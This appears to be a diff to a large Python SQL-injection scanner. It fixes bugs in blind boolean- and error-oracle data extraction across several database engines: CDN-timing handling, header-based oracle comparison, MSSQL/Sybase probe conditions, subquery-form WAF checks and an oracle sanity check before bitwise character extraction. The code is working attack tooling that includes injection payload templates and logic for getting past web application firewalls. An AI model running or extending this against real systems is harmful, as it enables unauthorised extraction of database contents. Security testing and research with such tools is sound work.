@@ -54038,9 +54038,18 @@ class Scanner:
         # to the real midpoint and the CDN retry becomes active for extraction probes.
         _thresh = 0.0
         _boolean_oracle = False   # also used in _send_payload before calibration sets it
-        
+        # BUG-FRESH-V214-4 FIX (CDN-ORIGIN-FAST-DETECTED-NO-FLAG): When the origin
+        # server responds in <220ms (fast origin), EVERY calibration probe triggers a
+        # 30s CDN-TTL wait + retry. The retry (fresh cache-busted URL, no CDN cache)
+        # also comes back <220ms because the ORIGIN itself is fast. Without this flag,
+        # each of the 8-10 calibration probes independently waits 30s → 4-5 minutes of
+        # wasted wait time before extraction even starts.
+        # Fix: after the first retry also comes back <220ms, set this flag to True.
+        # Subsequent probes skip the CDN wait — the origin is simply fast, not CDN-cached.
+        _cdn_origin_fast_detected = False
+
         async def _send_payload(inference_cond):
-            nonlocal _req_count, _template
+            nonlocal _req_count, _template, _cdn_origin_fast_detected
             # BUG-MSE-SEND-PAYLOAD-COND-NO-HEAVY-OBFUSCATION FIX (HIGH, all 5 DBMSes,
             # MultiStrategyExtractor._extract_str _send_payload(), ALL inference techniques,
             # ALL surfaces, ALL HTTP methods):
@@ -54237,7 +54246,8 @@ class Scanner:
             # doesn't catch it → propagates → kills extraction task silently.
             # Fix: explicitly catch CancelledError in the sleep; don't re-raise since
             # it's a deferred cancel artifact, not an intentional extraction stop.
-            if (not _boolean_oracle and 0 < ms < 220):
+            # BUG-FRESH-V214-4 FIX: also skip CDN wait when origin is known-fast
+            if (not _boolean_oracle and not _cdn_origin_fast_detected and 0 < ms < 220):
                 LOG.info("[Inference] CDN-cached response (%.0fms < 220ms) — "
                          "waiting 30s for CDN TTL expiry and retrying", ms)
                 try:
@@ -54265,6 +54275,12 @@ class Scanner:
                         # to avoid the CDN serving a cached block on the retry probe.
                         _bypass_mutation=False)
                     ms = (time.monotonic() - t0) * 1000
+                    # BUG-FRESH-V214-4 FIX: if fresh cache-busted URL STILL returns
+                    # <220ms, the origin server itself is fast — disable CDN waits.
+                    if ms < 220:
+                        _cdn_origin_fast_detected = True
+                        LOG.info("[Inference] CDN retry also fast (%.0fms) — "
+                                 "origin is fast, disabling CDN wait for remaining probes", ms)
                 except asyncio.CancelledError:
                     raise  # Genuine cancellation from retry — propagate
                 except Exception:
@@ -128345,6 +128361,8 @@ class MultiStrategyExtractor:
                 _sz_diff = abs(_el - _ol) > 20
                 # Also compare response headers (WAFs sometimes leak error info)
                 _hdr_diff = False
+                _hdr_diff_key = None
+                _hdr_diff_err_val = None
                 if fp_e and fp_o and hasattr(fp_e, "headers") and hasattr(fp_o, "headers"):
                     _eh = dict(getattr(fp_e, "headers", {}) or {})
                     _oh = dict(getattr(fp_o, "headers", {}) or {})
@@ -128355,6 +128373,14 @@ class MultiStrategyExtractor:
                                 "x-powered-by", "content-type"):
                         if _eh.get(_hk, "") != _oh.get(_hk, ""):
                             _hdr_diff = True
+                            # BUG-FRESH-V214-1 FIX: Save which header differed and the
+                            # error-response value so _eval_error can compare it directly
+                            # instead of falling back to status-code comparison.
+                            # When err_status == ok_status (both e.g. 400 due to WAF),
+                            # the status check `fp.status_code == err_status` is always
+                            # True → every oracle call returns True → all bits set → garbage.
+                            _hdr_diff_key = _hk
+                            _hdr_diff_err_val = _eh.get(_hk, "")
                             print(f"[MSE]   err({_name}): header diff on {_hk!r}", flush=True)
                             break
                 # Also check body similarity using sequence matching
@@ -128377,6 +128403,9 @@ class MultiStrategyExtractor:
                         "method": _name, "err_status": _es, "ok_status": _os,
                         "err_len": _el, "ok_len": _ol, "diff": _diff_type,
                         "stacked": _s,
+                        # BUG-FRESH-V214-1 FIX: store header key/val for header-diff oracles
+                        "hdr_key": _hdr_diff_key,
+                        "hdr_err_val": _hdr_diff_err_val,
                     }
                     return True
                 await asyncio.sleep(0.2)
@@ -128449,8 +128478,21 @@ class MultiStrategyExtractor:
             if fp is None:
                 continue
             _diff = self._err_info["diff"]
-            if _diff in ("status", "header"):
+            if _diff == "status":
                 _vote = getattr(fp, "status_code", None) == self._err_info["err_status"]
+            elif _diff == "header":
+                # BUG-FRESH-V214-1 FIX: Use the specific header that differed during
+                # probe detection instead of status-code comparison. When err_status ==
+                # ok_status (both WAF-blocked, e.g. 400/400), status comparison always
+                # returns True → oracle garbage. Compare the stored header key/val directly.
+                _hk = self._err_info.get("hdr_key")
+                _hev = self._err_info.get("hdr_err_val")
+                if _hk and _hev is not None:
+                    _fp_hdrs = dict(getattr(fp, "headers", {}) or {})
+                    _vote = _fp_hdrs.get(_hk, "") == _hev
+                else:
+                    # Fallback: no header key stored → compare status (old behaviour)
+                    _vote = getattr(fp, "status_code", None) == self._err_info["err_status"]
             else:
                 _l = len(_safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction") if fp else "")
                 _vote = abs(_l - self._err_info["err_len"]) < abs(_l - self._err_info["ok_len"])
@@ -129221,9 +129263,28 @@ class MultiStrategyExtractor:
                 elif self.dbms in ("MySQL", "MariaDB"):
                     _real_true = "@@version>=0x00"         # always true
                     _real_false = "@@version>=0x7a7a7a7a7a"  # likely false
-                elif self.dbms in ("MSSQL",):
-                    _real_true = "@@servername>=0x00"
-                    _real_false = "@@servername>=0x7a7a7a7a7a"
+                elif self.dbms in ("MSSQL", "Sybase"):
+                    # BUG-FRESH-V214-5 FIX (MEDIUM, MSSQL/Sybase, MSE oracle validation,
+                    # all extraction techniques, all surfaces, all HTTP methods):
+                    # The previous conditions used 0x hex varbinary literals:
+                    #   @@servername >= 0x00          (varbinary(1))
+                    #   @@servername >= 0x7a7a7a7a7a  (varbinary(5))
+                    # In MSSQL/Sybase, @@servername/@@SERVERNAME is NVARCHAR. Comparing
+                    # NVARCHAR to varbinary raises "Operand type clash: nvarchar is
+                    # incompatible with varbinary" — a SQL error, not a boolean result.
+                    # For error oracles: both probes cause SQL errors → oracle sees error
+                    # → r3 == r4 == True → falls into "basic OK but real condition gives
+                    # same result — WAF may block" path → misleading warning printed.
+                    # For bool_body_diff oracles: SQL errors produce error pages with sizes
+                    # different from normal responses → both sides match the "error" body
+                    # → r3 and r4 are both True/False → same misleading ambiguous path.
+                    # Fix: use proper MSSQL string conditions that involve DBMS metadata
+                    # without type clash. LEN(@@VERSION)>0 is always TRUE (@@VERSION is
+                    # never empty). CHARINDEX(N'ZZZZZZZZZZ',@@VERSION)>0 is always FALSE
+                    # (no MSSQL version string contains "ZZZZZZZZZZ"). Both use native
+                    # MSSQL string functions, no type coercion, no SQL errors.
+                    _real_true  = "LEN(@@VERSION)>0"
+                    _real_false = "CHARINDEX(N'ZZZZZZZZZZ',@@VERSION)>0"
                 else:
                     _real_true = "1<2"
                     _real_false = "1>2"
@@ -146884,7 +146945,16 @@ class ConditionalErrorTypeOracle:
                 # with complex SQL in a known-FALSE condition. If WAF returns clean_status
                 # (200) for it (matching true_sig), the oracle is unreliable → skip.
                 # Use SUBSTRING (extraction keyword) not VERSION()=0 (detection keyword).
-                _waf_chk_s = f"CASE WHEN (ASCII(SUBSTRING(CAST(1 AS VARCHAR),1,1))=0) THEN 1 ELSE ({eexpr}) END"
+                # BUG-FRESH-V214-2 FIX: WAF check must use a SELECT subquery form that
+                # matches what _bitwise_extract_with_oracle actually sends.  The old check
+                # used CAST(1 AS VARCHAR) — a constant with no SQL function calls — so WAFs
+                # that block DB function calls (current_database(), version(), etc.) passed
+                # this probe but blocked real extraction probes.  Calibration accepted the
+                # oracle, but every extraction probe matched true_sig → all bits set → garbled
+                # Unicode (e.g. U+FE9C7 as observed in the scan log).
+                # Fix: use a SELECT subquery with CAST to simulate the actual extraction form
+                # (which always wraps the DB query in a subquery inside SUBSTRING).
+                _waf_chk_s = f"CASE WHEN (ASCII(SUBSTRING((SELECT CAST(1 AS VARCHAR)),1,1))=0) THEN 1 ELSE ({eexpr}) END"
                 try:
                     _fp_waf_s, _ = await send_fn(_waf_chk_s)
                     _waf_s_status = getattr(_fp_waf_s, 'status_code', 0) if _fp_waf_s else 0
@@ -146916,7 +146986,11 @@ class ConditionalErrorTypeOracle:
                     # a false negative here. Updated to use the actual extraction form:
                     # ASCII(SUBSTRING(CAST(1 AS VARCHAR),1,1))&1=0 — always FALSE (=0),
                     # contains SUBSTRING and bitwise-AND (&) exactly as extraction uses.
-                    _waf_check = f"CASE WHEN (ASCII(SUBSTRING(CAST(1 AS VARCHAR),1,1))&1=0) THEN 1 ELSE ({eexpr}) END"
+                    # BUG-FRESH-V214-2 FIX (length path): Same subquery upgrade as status
+                    # path.  Constant CAST(1 AS VARCHAR) passes WAFs that block subqueries
+                    # or DB function calls; replace with (SELECT CAST(1 AS VARCHAR)) to
+                    # simulate the actual extraction probe form and catch WAF false-positives.
+                    _waf_check = f"CASE WHEN (ASCII(SUBSTRING((SELECT CAST(1 AS VARCHAR)),1,1))&1=0) THEN 1 ELSE ({eexpr}) END"
                     try:
                         _fp_waf, _ = await send_fn(_waf_check)
                     except Exception:
@@ -147024,6 +147098,34 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
         LOG.info("[Novel] %s: length=%d (empty or unreasonable)", label, length)
         return ""
     LOG.info("[Novel] %s: length=%d", label, length)
+
+    # BUG-FRESH-V214-3 FIX: Sanity-check the oracle with a known-always-false condition
+    # before starting character extraction.  If the oracle returns True for an impossible
+    # condition (X&0=1, which is always 0=1=FALSE in SQL for any X), the oracle is corrupt
+    # — typically because a WAF challenge page matches true_sig (e.g. both have status 200
+    # or content-length 557B).  Corrupt oracle → all bits set → garbled Unicode output
+    # (observed: U+FE9C7, U+718CB in scan log).  Detecting this early avoids wasting
+    # up to 200×21 = 4200 HTTP requests extracting garbage.
+    # Use length expression with &0=1 (always false: any_number & 0 = 0, never 1).
+    try:
+        _len_expr_sanity = len_tmpl.format(q=query)
+        if dbms == "Oracle":
+            _sanity_cond = f"BITAND({_len_expr_sanity},0)=1"
+        elif dbms == "Firebird":
+            _sanity_cond = f"BIN_AND({_len_expr_sanity},0)=1"
+        elif dbms == "ClickHouse":
+            _sanity_cond = f"bitAnd({_len_expr_sanity},0)=1"
+        else:
+            _sanity_cond = f"{_len_expr_sanity}&0=1"
+        _sanity_r = await eval_fn(_sanity_cond)
+        if _sanity_r:
+            LOG.warning("[Novel] %s: oracle sanity FAILED (always-false condition returned True) "
+                        "— oracle is corrupt (WAF challenge page matches true_sig); aborting extraction",
+                        label)
+            return ""
+    except Exception as _sanity_exc:
+        LOG.debug("[Novel] %s: oracle sanity check error (non-fatal): %s", label, _sanity_exc)
+    await asyncio.sleep(delay * 0.3)
 
     # Extract chars
     # BUG-BITWISE-7BIT-FIX: original used range(6,-1,-1) = 7 bits = max 127.
